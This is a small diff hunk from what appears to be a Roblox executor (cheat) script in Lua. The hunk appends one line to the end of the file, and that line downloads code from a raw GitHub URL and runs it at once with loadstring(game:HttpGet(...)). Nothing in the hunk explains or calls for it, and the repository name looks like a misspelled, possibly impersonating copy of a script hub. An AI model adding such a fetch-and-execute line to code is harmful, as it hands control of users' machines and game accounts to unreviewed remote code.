@@ -48,3 +48,4 @@ prompt.Enabled
     getgenv().ExecutorSupport = executorSupport
 end
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IssacRawCoreOfficiak/Mspaint/refs/heads/main/script"))()
